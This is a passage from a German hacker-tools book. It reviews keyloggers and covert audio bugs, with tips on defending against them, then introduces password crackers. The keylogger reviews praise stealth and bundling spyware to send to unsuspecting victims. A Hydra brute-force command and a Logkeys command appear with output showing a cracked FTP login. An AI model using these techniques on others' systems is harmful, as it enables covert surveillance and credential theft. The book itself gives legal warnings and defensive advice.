519 18.11 Linux unter Kontrolle: Password-Cracking ...................................... 521 18.11.1 John the Ripper .............................................................................. 522 18.11.2 ophcrack........................................................................................ 523 18.11.3 Medusa.......................................................................................... 525 18.11.4 Hydra ............................................................................................. 527 18.12 Schutz vor Scannern, Exploits, Sniffern & Co.................................. 530 Teil III: Pr\u00e4vention und Prophylaxe .................................................................... 533 19 Private Networking .................................................................................... 535 19.1 Sicherheitsstatus mit MBSA \u00fcberpr\u00fcfen......................................... 535 19.2 \u00dcberfl\u00fcssige Dienste...................................................................... 541 19.3 Vor \u00bbDienstschluss\u00ab Abh\u00e4ngigkeiten \u00fcberpr\u00fcfen ........................... 543 19.4 Alle Dienste mit dem Process Explorer im Blick .............................. 544 19.5 Externer Security-Check tut Not ...................................................... 546\nInhaltsverzeichnis\n19.6 19.7 19.8\n15\nMalware-Check .............................................................................. 548 Risiko: Mehrbenutzer-PCs und Netzwerksharing ............................ 564 Schadensbegrenzung: Intrusion Detection & Prevention ................ 572\n20 Company Networking................................................................................. 577 20.1 Basiselemente zur Unternehmenssicherheit .................................. 582 20.2 Teilbereich Infrastruktur und Organisation ..................................... 583 20.3 Teilbereich Personal....................................................................... 585 20.4 Teilbereich Technik ........................................................................ 588 Stichwortverzeichnis ................................................................................. 593\n17\nTeil I: Tools \u2013 Werkzeuge f\u00fcr Angriff und Verteidigung Wir stellen hier einige Tools vor, mit denen man relativ schr\u00e4ge Dinge machen kann. Aber denken Sie daran: Wenn Sie unsere Experimente praktisch nachvollziehen wollen, sollten Sie vorab einige Sicherheits\u00fcberlegungen anstellen. Der wichtigste Punkt betrifft Ihre eigene Sicherheit. Etliche der hier vorgestellten Tools fallen, zumindest aus der Sicht von Virenscannern, ziemlich eindeutig in die Kategorie Malware. Praktisch gesprochen: Allein schon auf der Suche nach den Tools gehen Sie das Risiko ein, infiziert zu werden. Da viele dieser Tools nur im Darknet zu finden sind, wissen Sie nie genau, ob sie nicht mehr Funktionalit\u00e4t bereithalten, als Ihnen lieb sein d\u00fcrfte. Wenn Sie jetzt denken, dass Sie prinzipiell sehr gut ger\u00fcstet sind und die besten und neuesten Antimalware-Tools, Firewalls etc. installiert haben, kommt schon die n\u00e4chste Ern\u00fcchterung. Die meisten Hackertools lassen sich nur dann zur Zusammenarbeit bewegen, wenn Sie Ihr Visier hochklappen, d. h. aktivierte Firewalls wie Zonealarm Pro oder aktivierte Online-Virenw\u00e4chter werden Ihnen im schlimmsten Fall die Sch\u00e4dlinge schneller l\u00f6schen, als Sie diese aus dem Internet runterladen; mindestens aber werden sie Sie wirkungsvoll vom Experimentieren abhalten und entsprechende Aktionen der Hackertools deaktivieren. Halten Sie das bitte nicht f\u00fcr eine \u00dcbertreibung. Ich (PK) hatte eine sch\u00f6ne Sammlung von Sch\u00e4dlingen f\u00fcr weitere Experimente auf meiner Festplatte versammelt. Als ich kurze Zeit sp\u00e4ter darauf zugreifen wollte, waren die meisten davon nicht mehr vorhanden. Ein Antivirustool hatte sie umbenannt und in Quarant\u00e4ne verschoben. Als ordentlicher Mensch hatte ich nat\u00fcrlich ein Backup gemacht. Aber als ich jetzt die Verzeichnisse \u00f6ffnen wollte \u2013 das alte Spiel, wieder war alles weg. Deshalb m\u00fcssen Sie im Prinzip drei ziemlich widerspr\u00fcchliche Ratschl\u00e4ge befolgen: \u2022\nLaden Sie Hackertools nur von vertrauensw\u00fcrdigen Quellen (es gibt durchaus Hacker- oder Security-Seiten wie http://packetstormsecurity.nl, http://www.milw0rm. com/ oder http://www.rootkit.com, die es sind).\n\u2022\nPr\u00fcfen Sie die Dateien, bevor Sie sie anklicken, ob nicht mehr Malware an Bord ist als sein sollte.\n\u2022\nDeaktivieren Sie fallweise Ihren Onlineschutz, um die Tools in ihrer gesamten Bandbreite testen zu k\u00f6nnen (und lassen Sie hinterher einen oder mehrere Scanner \u00fcber Ihr System laufen).\nAm besten w\u00e4re es, wenn Sie diese Tests auf einer in sich gekapselten, virtuellen Maschine ausf\u00fchren, z. B. von VMware; ersatzweise tut es auch eine separate, bootf\u00e4hige Festplatte, die Sie nach den Experimenten mit einem Imagebackup wieder in den urspr\u00fcnglichen Zustand zur\u00fcckversetzen. Ber\u00fccksichtigen sollten Sie hierbei nat\u00fcrlich auch die weiteren im Netzwerk befindlichen Rechner: Starten Sie einen aktuellen Wurm\n18\nKapitel 1 \u2013 Teil I: Tools \u2013 Werkzeuge f\u00fcr Angriff und Verteidigung\nund sind die restlichen Maschinen Ihres Netzwerks verwundbar, dann eskaliert das urspr\u00fcnglich zu wissenschaftlichen Zwecken angedachte Szenario zu einem GAU. Eine letzte Warnung m\u00fcssen wir Ihnen auch noch mit auf den Weg geben. Die meisten der hier vorgestellten Tools \u2013 auch wenn sie etwas angejahrt sind \u2013 haben ein (immer noch) erhebliches Angriffspotenzial mit der realen M\u00f6glichkeit, weniger gut gesch\u00fctzte Systeme bzw. deren Anwender zu sch\u00e4digen. Das wiederum ist kein Kavaliersdelikt, sondern kann zu strafrechtlichen Konsequenzen f\u00fchren. Wenn Sie hacken und cracken wollen, dann bitte ausschlie\u00dflich auf Ihrem eigenen Netzwerk oder nach vorheriger R\u00fccksprache mit Ihren \u00bbTestkandidaten\u00ab. Was die aktuelle Werkzeugsammlung betrifft: Sie finden hier unterteilt in zehn Rubriken Tools aus der Windows- und Linux-/UNIX-Welt. Unsere Auswahl ist nat\u00fcrlich subjektiv. Wir haben die Programme ausgew\u00e4hlt, mit denen wir in der Praxis gearbeitet haben und noch arbeiten. Darunter sind sehr g\u00e4ngige Werkzeuge wie Nmap, OpenVAS oder das Metasploit Framework, aber auch ausgefallenere Tools wie USBDUMPER2 und der Stealth Recorder. Bei den kommandozeilenbasierten Linux-Tools haben wir jeweils alle relevanten Eingabeparameter und auch das Ausgabeformat in den meisten F\u00e4llen vollst\u00e4ndig aufgelistet. Wem die Routine mit diesen Tools fehlt, der hat somit gleichzeitig auch ein kleines Nachschlagewerk parat. Wir w\u00fcnschen Ihnen viel Freude beim Testen und bei der Netzwerkerforschung. Bei der \u00dcberarbeitung ist uns ein unliebsamer Effekt begegnet: innerhalb weniger Wochen k\u00f6nnen die \u00bbLieferadressen\u00ab von Underground Tools (selbst wenn sie \u00e4lteren Ursprungs sind) einfach von der Bildfl\u00e4che verschwunden sind. So geschehen mit USB Switchblade bzw. 7zBlade. Wir haben uns bem\u00fcht, g\u00fcltige Bezugsquellen anzugeben. Es liegt aber in der Natur der Sache, dass die Halbwertszeit dieser Seiten beschr\u00e4nkt ist. Im Zweifelsfall, der hoffentlich Einzelfall bleiben wird, werden Sie selbst also nach bestimmten hier vorgestellten Tools per Google \u00bbnachfassen\u00ab m\u00fcssen. Noch eine letzte Anmerkung zum Stichwort \u00bbRedundanz\u00ab. Den hier aufgef\u00fchrten Tools werden Sie zum gro\u00dfen Teil (aber nicht ausschlie\u00dflich) in unseren Angriffsszenarien begegnen \u2013 und sie im konkreten Angriffskontext erleben. Aber wir werden dort wie auch beim Thema Prophylaxe einige weitere Werkzeuge benutzen, die Sie hier nicht finden, weil wir diesen Rahmen nicht sprengen wollten. Es geht uns weniger um die Tools, die in bestimmten Zusammenh\u00e4ngen austauschbar sind, sondern um das konkrete Doing und das daf\u00fcr notwendige Know-how.\n19\n1\nKeylogger \u2013 Spionage par excellence\nDer Begriff \u00bbKeylogger\u00ab, auf Deutsch: Tastaturrekorder, klingt auf den ersten Blick eher harmlos. Keylogger sind aber eine der gr\u00f6\u00dften Gefahren, denen sich Privatpersonen und Firmen heute ausgesetzt sehen. Keylogger existieren als Hardware- und als Softwareausf\u00fchrung. Ihr Zweck ist derselbe: alles aufzuzeichnen, was der Anwender auf der Tastatur seines PCs eingibt: \u2022\nCMOS-Passw\u00f6rter\n\u2022\nBenutzeraccounts\n\u2022\nPIN-/TAN-Kombinationen f\u00fcrs Online-Banking\n\u2022\nLogin-Daten f\u00fcr diverse Webdienste (E-Mail-Accounts, Forenanmeldungen etc.)\n\u2022\nPassw\u00f6rter zum Verschl\u00fcsseln von Festplatten, Verzeichnissen, Dateien\n\u2022\nZus\u00e4tzlich nat\u00fcrlich alle Texte in Eingabemasken, Formularen, Chatrooms etc.\nManche Keylogger speichern auch Screenshots, damit der Angreifer auch die anderen visuellen Aktivit\u00e4ten seiner Opfer mitverfolgen kann. Besonders heimt\u00fcckisch sind Keylogger, die als Hardwaremodul zwischen Tastatur und Rechner eingeschleift werden und dabei alle Daten von der Tastatur mitschneiden, bevor sie \u00fcber das Betriebssystem an das jeweilige Anwenderprogramm \u00fcbergeben werden. Die Softwarefraktion geht einen anderen Weg: Meist wird hier ein Treiber installiert \u2013 vorzugsweise auf Kernelebene \u2013, der vom Benutzer v\u00f6llig unbemerkt alle Eingaben abf\u00e4ngt, aufzeichnet und dann an das jeweilige Programm \u00fcbergibt. Die Keylogger, die wir hier vorstellen, sind Standalone-Produkte. Daneben findet sich die Funktionalit\u00e4t von Keyloggern auch in diversen Malware- und Spyware-Programmen installiert, insbesondere in Trojanern und RATs (Remote Access Tools). Die Funktionalit\u00e4t der SW-Keylogger ist ziemlich ausgereift. So gibt es Programme, die nicht nur Sessions mitschneiden (via Screenshots oder auch als kleine Filme), Tastatureingaben protokollieren, die Eingaben verschl\u00fcsseln und ihre Spuren mittels Rootkits tarnen, sondern auch Spezialentwicklungen, um gezielt Daten auszulesen und diese dann durch die Firewall nach au\u00dfen schmuggeln zu k\u00f6nnen. Keylogger lassen sich nat\u00fcrlich auch zu Verteidigungszwecken nutzen, beispielsweise um Betrugsf\u00e4llen und dem Ausspionieren von Firmengeheimnissen auf die Spur zu kommen. In Deutschland fallen diesbez\u00fcgliche Aktivit\u00e4ten (im \u00dcbrigen wie fast alle hier beschriebenen Tools) unter das Strafgesetzbuch \u00a7 202a \u2013 Aussp\u00e4hen von Daten \u2013 und sind damit strafbewehrt bzw. nur in geregelten Ausnahmef\u00e4llen zul\u00e4ssig.\n20\nKapitel 1 \u2013 Keylogger \u2013 Spionage par excellence\n1.1\nLogkeys\nAnbieter\nhttp://code.google.com/p/logkeys\nBetriebssystem(e) Linux/UNIX Kategorie(n)\nKeylogger\nGr\u00f6\u00dfe\n< 1 MB\nUsability\nInstallation / Kompilation\nPreis\n-\nSprachen\nEnglisch\nOberfl\u00e4che\nGUI\nCMD x\nNein / Schnittstellen Ja\nKnow-how\nBei Logkeys handelt es sich um einen Keylogger f\u00fcr Linux, der sowohl auf seriellen als auch auf USB-Tastaturen l\u00e4uft. Logkeys erfasst und protokolliert s\u00e4mtliche Eingaben, die auf der Tastatur eingegeben werden. Logkeys \u00fcbersetzt die eingegebenen Zeichen in das ASCII-Format. Der Einsatz von Logkeys mit folgenden Parametern: \u2022\n-s start logging keypresses\n\u2022\n-o log output to FILE [/var/log/logkeys.log]\nbringt z. B. folgendes Ergebnis: sh-3.2# cat /var/log/logkeys.log Logging started ... 2010-03-10 2010-03-10 2010-03-10 2010-03-10 2010-03-10 2010-03-10 (...) 2010-03-10 2010-03-10 sh-3.2#\n19:35:18+0000 19:35:35+0000 19:46:46+0000 19:46:55+0000 19:47:22+0000 19:47:29+0000\n> > > > > >\nuname -a ps -aux useradd -m hweber passwd hweber maxtor19! maxtor19!\n19:47:47+0000 > aptitude update 19:48:05+0000 > exit\nBild 1.1: Logkeys beim Aufzeichnen von Tastatureingaben\n1.2\nElite Keylogger Trial, ab 49 \u20ac\nAnbieter\nwww.widestep.com\nPreis\nBetriebssystem(e)\nWin Vista x32, XP, 2000\nSprachen\nEnglisch\nKategorie(n)\nKeylogger\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 5 MB\nUsability\nInstallation\nJa Know-how\nx\nSchnittstellen\nCMD\n1.2 Elite Keylogger\n21\nNach unseren Tests geh\u00f6rt der Elite Keylogger V. 4.5 (Stand IV/2009) nach wie vor zu den besten (Funktionalit\u00e4t) und technologisch fortgeschrittensten Vertretern seiner Art. Er zeigt, was heute in dem Bereich machbar ist, um selbst misstrauische und erfahrene PC-Anwender unbemerkt und effektiv auszuspionieren. Da es sich beim Elite Keylogger um ein kommerzielles Produkt handelt, ist er ziemlich gut getarnt vor den meisten Viren- und Malware-Scannern. Sein Tarnmantel ist so gut, dass er mit herk\u00f6mmlichen Betriebssystemmitteln nicht entdeckt werden kann. Die einzige M\u00f6glichkeit, ihm beizukommen, ist der Einsatz von Antirootkits. Besonders hervorzuheben ist seine F\u00e4higkeit, die protokollierten Daten applikationsspezifisch auswerten zu k\u00f6nnen, d. h., man sieht auf einen Blick, welche Briefe in Word geschrieben, welche Tabellen in Excel angelegt, welche E-Mails mit welchen Inhalten verschickt bzw. in welchen Chats welche Dialoge gef\u00fchrt wurden. Das erleichtert die Auswertung nicht unbetr\u00e4chtlich. Ein herausragendes Feature ist die Verteilung der Logs auf andere Rechner im Netz. Man muss sich nicht mehr via E-Mail informieren lassen (und gegebenenfalls verd\u00e4chtige Meldungen der Firewall riskieren), um in aller Ruhe Daten sammeln und auswerten zu k\u00f6nnen. Der f\u00fcrs Unsichtbarmachen zust\u00e4ndige Kerneltreiber wird in regelm\u00e4\u00dfigen Abst\u00e4nden aktualisiert.\nBild 1.2: Komfortabel und unsichtbar\n22\nKapitel 1 \u2013 Keylogger \u2013 Spionage par excellence\n1.3\nArdamax Keylogger\nAnbieter\nwww.ardamax.com\nPreis\nTrial, ab 28,95 \u20ac\nBetriebssystem(e)\n2000/XP/Vista/Windows 7\nSprachen\nEnglisch\nKategorie(n)\nKeylogger\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n> 5 MB\nUsability\nInstallation\nJa Know-how\nx\nCMD\nSchnittstellen\nNicht vom Leistungsumfang, wohl aber von der Dateigr\u00f6\u00dfe einer der kleinsten (und unauff\u00e4lligsten) Keylogger. Die Bedienung ist sehr simpel; in wenigen Minuten ist der Keylogger konfiguriert und unsichtbar gemacht. Zwei Highlights haben uns besonders gut gefallen: \u2022\nDie M\u00f6glichkeit, ein Remote- bzw. Servermodul zu konfigurieren, das man z. B. mit einem anderen n\u00fctzlichen Programm b\u00fcndeln und einem ahnungslosen Opfer zuschicken kann. Vorteil: Man muss den Keylogger nicht vor Ort installieren.\n\u2022\nDie Eingabe eines k\u00fcnstlichen Verfalldatums. Das kann sehr n\u00fctzlich sein, wenn man sein Opfer nur \u00fcber eine definierte Zeitspanne \u00fcberwachen kann oder muss: Danach deinstalliert sich das Programm v\u00f6llig unbemerkt.\nBild 1.3: Auswertungsfenster Keylogger\n1.4 Stealth Recorder Pro\n23\nDie Logs sind verschl\u00fcsselt; man kann sie sich als HTML-Report via E-Mail zuschicken oder \u00fcber einen FTP-Server bzw. relativ leicht \u00fcbers LAN an eine geheime Adresse verschicken lassen.\n1.4\nStealth Recorder Pro\nAnbieter\n\u00dcber Distributor lieferbar, z. B. www.brothersoft.com\nPreis\nTrial, ab 39,95 $\nBetriebssystem(e)\nWindows\nSprachen\nEnglisch\nKategorie(n)\nKeylogger\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 500 KB\nUsability\nInstallation\nJa Know-how\nx\nCMD\nSchnittstellen\nEigentlich kein Keylogger im strengen Sinn des Wortes, sondern eine Audiowanze mit verbl\u00fcffendem Funktionsumfang. Ziel des Angriffs sind Gespr\u00e4che, die in der N\u00e4he des Rechners oder Notebooks gef\u00fchrt werden. Eigene Tests ergaben, dass selbst mit einem g\u00fcnstigen Notebook alles aufgezeichnet werden kann, was im Umkreis von mehr als 10 m gesprochen wird. M\u00f6glich wird dies durch eine neuartige Boostertechnologie, die den Input eines handels\u00fcblichen Mikrofons um mehr als das 100-Fache verst\u00e4rken kann. Die Software zeichnet \u2013 in Abh\u00e4ngigkeit des gew\u00e4hlten Umgebungspegels \u2013 jedes gesprochene bzw. gefl\u00fcsterte Wort im mp3-Format (unterschiedliche Qualit\u00e4tsstufen w\u00e4hlbar) auf und versendet diese Dateien via E-Mail oder FTP. Ein besonderes Schmankerl ist die Fernabfragem\u00f6glichkeit. Dadurch ist es einem Angreifer von au\u00dfen m\u00f6glich, \u00fcber einen definierten Port auf die MP3-Dateien zuzugreifen. Man muss die Software nicht unbedingt einem potenziellen Opfer aufs Notebook oder den Rechner packen, sondern kann sie auf seinem eigenen Notebook installieren und in Meetings platziert einsetzen. Bei vielen Notebooks besteht ja der Vorteil darin, dass man kein separates Mikrofon braucht, sondern dieses bereits eingebaut ist.\nBild 1.4: Zugriff auf die Audiowanze von au\u00dfen\n24\nKapitel 1 \u2013 Keylogger \u2013 Spionage par excellence\n1.5\nElite Keylogger V.1\nAnbieter\nwww.hackinglibrary.ws\nPreis\n-\nBetriebssystem(e)\nWindows\nSprachen\nEnglisch\nKategorie(n)\nKeylogger\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 1 MB\nUsability\nInstallation\nJa\nx\nCMD\nSchnittstellen\nKnow-how\nNein, kein Schreibfehler, keine Vorg\u00e4ngerversion, sondern ein eigenst\u00e4ndiges Hackerprodukt mit gewissen Vorz\u00fcgen. Z. B. kann man den erzeugten Remote-Installer noch mit einem anderen, harmlosen Produkt, u. a. einer kleinen Videodatei, b\u00fcndeln, damit das Opfer keinen Verdacht sch\u00f6pft. Zus\u00e4tzlich kann man die Abh\u00f6raktion zeitlich auch begrenzen, quasi mit einem Verfallsdatum versehen, was die Gefahr, entdeckt zu werden, ebenfalls minimiert.\nBild 1.5: Keylogger als typisches Hackertool\n1.6\nHardware-Keylogger\nAnbieter\nebay oder www.thinkgeek.com\nPreis\nAb 19,00 \u20ac\nBetriebssystem(e)\nunabh\u00e4ngig\nSprachen\nEnglisch\nKategorie(n)\nKeylogger\nOberfl\u00e4che\nGUI x\nGr\u00f6\u00dfe\n< 2 MB\nInstallation\nJa\nSchnittstellen\nCMD\n1.6 Hardware-Keylogger\n25\nFeatures\nUsability\nKnow-how\nBild 1.6: Hardware-Keylogger bei eBay\nHardware-Keylogger k\u00f6nnen wahlweise an den PS2- oder USB-Port des Zielrechners eingeschleift werden, optional gibt es auch Module, die in die Tastatur eingebaut werden oder spezielle Tastaturen. Da diese Keylogger auf Hardware basieren, k\u00f6nnen sie mit keiner Software entdeckt werden. Sie speichern je nach Ausf\u00fchrung bis zu einige Millionen Zeichen inklusive CMOS-Passwort, Verschl\u00fcsselungscodes f\u00fcr die Festplatte etc. Wenn man sie wieder vom Rechner abzieht, k\u00f6nnen sie sp\u00e4ter in gesch\u00fctzter Umgebung mit einem mitgelieferten Programm oder einem simplen Texteditor ausgelesen werden.\nBild 1.7: Auslesen des Hardware-Keyloggers\n26\nKapitel 1 \u2013 Keylogger \u2013 Spionage par excellence\nHardware-Keylogger z\u00e4hlen zu den gef\u00e4hrlichsten Spionagetools, weil sie a) einfach und preiswert zu beschaffen, b) schnell zu installieren und c) relativ einfach auszuwerten sind. Au\u00dferdem helfen sie, den Verschl\u00fcsselungsschutz von Festplatten mit PBA (Pre Boot Authentication) zu brechen. Die Abwehrm\u00f6glichkeiten sind beschr\u00e4nkt: Visuelle Inspektion des Rechners in regelm\u00e4\u00dfigen Abst\u00e4nden sowie Einsatz von Smartcards und Tokens, in Kombination mit einer Festplattenverschl\u00fcsselung k\u00f6nnen helfen, den Schaden zu begrenzen.\n1.7\nAbwehr \u2013 generelle Tipps\nGrunds\u00e4tzlich sind bei den Abwehrstrategien zwei Szenarien zu unterscheiden: Prophylaxe auf der einen und Unsch\u00e4dlichmachen auf der anderen Seite. Im ersten Fall droht der unmittelbare Angriff von Keyloggern, w\u00e4hrend er im zweiten Fall bereits erfolgt ist. Hardware-Keylogger abzuwehren ist eine der anspruchsvollsten Verteidigungsma\u00dfnahmen, da hier allein mit Software wenig auszurichten ist. In der Praxis kommen prinzipiell nur drei Ma\u00dfnahmen in Betracht: 1. Physikalische Schutzma\u00dfnahmen Sensible PCs werden vor feindlichen Zugriffsversuchen physisch gesch\u00fctzt (z. B. durch Personenkontrolle, Wegschlie\u00dfen etc.), bzw. die Hardware (PC-Geh\u00e4use und Peripherie wie Tastaturen etc.) wird regelm\u00e4\u00dfig auf Manipulationen untersucht. 2. Festplattenverschl\u00fcsselung mit Pre Boot Authentication via Chipkarte, USB-Stick etc. (2-Faktoren Authentifizierung) Diese Ma\u00dfnahme verhindert, dass das Startpasswort ausgesp\u00e4ht und damit die BootKontrolle \u00fcber den PC \u00fcbernommen werden kann, da grunds\u00e4tzlich nur die Tastatureingabe, aber nicht der Hardwareschl\u00fcssel der Chipkarte mitprotokolliert werden kann. 3. Einsatz virtueller, mausgesteuerter Tastaturen & Passwortsafes Hardware-Keylogger speichern nur reale Tastendr\u00fccke, aber keine dezidierten Mausbewegungen bzw. Mausklicks. Ohne physikalische Absicherung bleiben die Ma\u00dfnahmen 2 und 3 allerdings St\u00fcckwerk. Man wird zwar mehr oder weniger zuverl\u00e4ssig das Aussp\u00e4hen von Anmeldekennungen und Passw\u00f6rtern verhindern k\u00f6nnen, schwerlich aber die Kompletteingabe gr\u00f6\u00dferer Textmengen, da virtuelle Tastaturen nicht f\u00fcr die Eingabe gr\u00f6\u00dferer Textmengen gedacht sind. Softwarebasierte Keylogger sind zwar grunds\u00e4tzlich einfacher abzuwehren, bergen aber auch gr\u00f6\u00dfere Gefahrenpotenziale (breitere Einsatzm\u00f6glichkeiten, fast unbeschr\u00e4nkte Speicherm\u00f6glichkeiten, Fernzugriff, auch von Laien leicht einzusetzen). Ist der PC verschl\u00fcsselt bzw. der Zugang physikalisch erschwert, kommen als Infektionsquellen nur speziell pr\u00e4parierte Datentr\u00e4ger (CD, DVD, USB-Sticks, Festplatten etc.) oder verseuchte Webseiten und Mailanh\u00e4nge in Betracht. Da im Bereich der Industriespionage h\u00e4ufig dezidierte L\u00f6sungen eingesetzt werden, laufen g\u00e4ngige signaturbasierte Malwarescannner h\u00e4ufig ins Leere. Hier helfen dann Speziall\u00f6sungen wie der kernelbasierte Anti Keylogger Elite, der auch unbekannte Keylogger in Echtzeit schachmatt setzt.\n1.7 Abwehr \u2013 generelle Tipps\n27\nSchw\u00e4cher sind virtuelle Tastaturen (da auch Mausbewegungen in Kombination mit Screenshots aufgenommen werden k\u00f6nnen). Einfache L\u00f6sungen, um das Aussp\u00e4hen von Kennungen und Passw\u00f6rter via Internetbrowser zu erschweren, sind Add-Ons wie Key Scrambler & Co. Da die Softwareprophylaxe immer einem gewissen Unsicherheitsfaktor unterliegt, sollten fortschrittliche Diagnosetechniken wie Anti-Rootkits, Netzwerkmonitore, IDS etc. eingesetzt werden. Eine weitere, simple M\u00f6glichkeit ist der Ausbau einer verd\u00e4chtigen Bootpartition/-platte. Da hier kein Rootkit mehr die protokollierten Mitschnitte sch\u00fctzt, kann man eine datumsbasierte Dateisuche starten (gr\u00f6\u00dfere Dateien der letzten Tage), um Protokolldateien von Keyloggern zu entdecken. Sind diese Dateien nur im ausgebauten Zustand auf der Platte zu entdecken, nicht aber im laufenden Betrieb, kann man mit einiger Sicherheit davon ausgehen, dem \u00dcbelt\u00e4ter auf die Schliche gekommen zu sein.\n29\n2\nPasswort-Knacker: Wo ein Wille ist, ist auch ein Weg\nF\u00fcr viele Funktionen des Betriebssystems, des Netzwerks und vieler Anwenderprogramme existieren Passw\u00f6rter, die vorzugsweise sicherstellen sollen, dass nur autorisierte Personen unter anderem diese Funktionen nutzen: \u2022\nCMOS-Passwort\n\u2022\nAdministratorpasswort\n\u2022\nUser-Logins\n\u2022\nWindows CD-Key\n\u2022\nNetzpassw\u00f6rter\n\u2022\nUser-Passw\u00f6rter\n\u2022\nWireless (WPA-PSK/WPA2) Encryption Keys\nWer sich als Angreifer Zugriff auf fremde Netze bzw. fremde Computer verschaffen will, muss hier etliche H\u00fcrden nehmen. Grunds\u00e4tzlich k\u00f6nnen Passw\u00f6rter umgangen bzw. au\u00dfer Kraft gesetzt oder durch entsprechende Attacken (Dictionary / Brute Force / Rainbow Tables) geknackt werden. Die hier exemplarisch vorgestellten Tools repr\u00e4sentieren aus unserer Sicht die leistungsf\u00e4higsten Angriffswerkzeuge, wobei nicht verschwiegen werden soll, dass auch Knackwerkzeuge durchaus einen legitimen Sinn haben k\u00f6nnen, z. B. den Zugriff dort zu erm\u00f6glichen, wo der Anwender schlicht und einfach sein Passwort vergessen hat, oder f\u00fcr den gewissenhaften Administrator, der die H\u00e4rte von Userkennw\u00f6rtern testet, um m\u00f6glichen Angreifern zuvorzukommen. Ansonsten gilt es, den \u00a7 202c StGB (\u00bbHackerparagraphen\u00ab) zu beachten, der das Aussp\u00e4hen fremder Daten unter Strafe stellt.\n2.1\nCMOSPwd\nAnbieter\nwww.cgsecurity.org\nPreis\n-\nBetriebssystem(e)\nWindows, Linux, BSD\nSprachen\nEnglisch\nKategorie(n)\nPasswort-Cracker\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 300 KB\nUsability\nInstallation\nGUI\nNein\nSchnittstellen\nKnow-how\nCMD x\nEin simples, aber wirkungsvolles Werkzeug, um die Kontrolle \u00fcber einen fremden PC zu erlangen \u2013 ohne dass daf\u00fcr ein Keylogger eingesetzt oder zum Schraubenzieher gegriffen werden muss. Einzige Voraussetzung: Der PC muss sich booten lassen. Danach kann \u00fcber eine DOS-Startdisk oder auch \u00fcber Windows das Passwort ausgelesen werden.\n30\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\nBild 2.1: Auslesen des BIOS-Passworts\n2.2\nHydra\nAnbieter\nhttp://freeworld.thc.org/thc-hydra Preis\nBetriebssystem(e) Linux/UNIX, Mac OS X, Cygwin unter Windows, ARM-Linux und PalmOS\nSprachen\nKategorie(n)\nLogin Passwort-Cracker (Remote) Oberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation Know-how\nEnglisch\nGUI\nNein / Schnittstellen Ja\nx CMD x Ben\u00f6tigt libssh\nBei diesem Tool handelt es sich um einen Passwort-Cracker, der mittels W\u00f6rterbuchattacke versucht, die Kennw\u00f6rter entfernter Logins verschiedenster Dienste zu ermitteln. Hydra zeichnet sich durch die M\u00f6glichkeit aus, parallele Attacken auf diverse Dienste zu fahren, unterst\u00fctzt Verbindungen \u00fcber SSL / Proxy-Server und simuliert die Netzwerkprotokolle Telnet, FTP, POP3[-ntlm], IMAP[-ntlm], SMB, SMBNT, HTTP[s]{head|get}, HTTP-{get|post}-form, HTTP-PROXY, Cisco, Cisco-Enable, VNC, LDAP2, LDAP3, MS-SQL, MySQL, Oracle-Listener, Postgres, NNTP, SOCKS5, REXEC, RLOGIN, PCNFS, SNMP, RSH, CVS, SVN, ICQ, SAPR3, SSHv2, SMTP-AUTH[-ntlm], PcAnywhere, TEAMSPEAK, SIP und VMAUTHD. Ein Passwort-Check, durchgef\u00fchrt auf dem FTP-Server fileserver.snakeoil.net mit den Parametern: \u2022\n-v (verbose mode / show login+pass combination for each attempt)\n\u2022\n-L (load several logins from FILE)\n2.2 Hydra\n31\n\u2022\n-P (load several passwords from FILE)\n\u2022\n-e ns (additional checks, \"n\" for null password, \"s\" try login as pass)\nbringt folgendes Ergebnis:\ndiscordia:~# hydra -v -L user.lst -P word.lst -e ns fileserver.snakeoil.net ftp Hydra v5.4 (c) 2006 by van Hauser / THC \u2013 use allowed only for legal purposes. Hydra (http://www.thc.org) starting at 2010-03-17 00:16:44 [DATA] 16 tasks, 1 servers, 75684 login tries (l:3/p:25228), ~4730 tries per task [DATA] attacking service ftp on port 21 [VERBOSE] Resolving addresses ... done [STATUS] 347.00 tries/min, 347 tries in 00:01h, 75337 todo in 03:38h [STATUS] 329.67 tries/min, 989 tries in 00:03h, 74695 todo in 03:47h [VERBOSE] Writing restore file... done [STATUS] 324.14 tries/min, 2269 tries in 00:07h, 73415 todo in 03:47h [VERBOSE] Writing restore file... done [VERBOSE] Writing restore file... done [STATUS] 320.87 tries/min, 4813 tries in 00:15h, 70871 todo in 03:41h (...) [STATUS] 318.85 tries/min, 45596 tries in 02:23h, 30088 todo in 01:35h [VERBOSE] Writing restore file... done [VERBOSE] Writing restore file... done [VERBOSE] Writing restore file... done [21][ftp] host: 192.168.2.100 login: johndoe password: elvisisalive [VERBOSE] Skipping current login as we cracked it [STATUS] attack finished for 192.168.2.100 (waiting for childs to finish) Hydra (http://www.thc.org) finished at 2010-03-17 02:55:19 discordia:~#\nBild 2.2: Hydra beim Brechen eines FTP-Zugangs unter Verwendung eines W\u00f6rterbuchs\n32\nKapitel 2 \u2013 Passwort-Knacker: Wo ein Wille ist, ist auch ein Weg\nBild 2.3: HydraGTK mit GTK-Interface\n2.3\nMedusa\nAnbieter\nwww.foofus.net\nPreis\n-\nBetriebssystem(e)\nLinux, SunOS, BSD, Mac OS X, Windows/Cygwin\nSprachen\nEnglisch\nKategorie(n)\nLogin Passwort-Cracker\nOberfl\u00e4che\nGUI\nCMD\nx\n(Remote) Gr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nNein / Ja Schnittstellen OpenSSL, LibSSH2, NCPFS, LibPQ, Subversion, afpfs-ng Know-how\nMedusa ist ein schneller, parallel arbeitender und modular aufgebauter Login-BruteForcer, der mittels W\u00f6rterbuchattacke versucht, die Kennw\u00f6rter entfernter Logins verschiedenster Dienste zu ermitteln. Der Password-Cracker l\u00e4sst sich mit zus\u00e4tzlichen Modulen erweitern, ohne dass dabei die Core-Anwendung modifiziert werden m\u00fcsste. Medusa unterst\u00fctzt die folgenden Netzwerkdienste: AFP, CVS, FTP, HTTP, IMAP, MSSQL, MySQL, NetWare NCP, NNTP, PcAnywhere, POP3, PostgreSQL, REXEC, RLOGIN, RSH, SMBNT, SMTP-AUTH, SMTP-VRFY, SNMP, SSHv2, Subversion (SVN), Telnet, VMware Authentication Daemon (vmauthd), VNC, Generic Wrapper 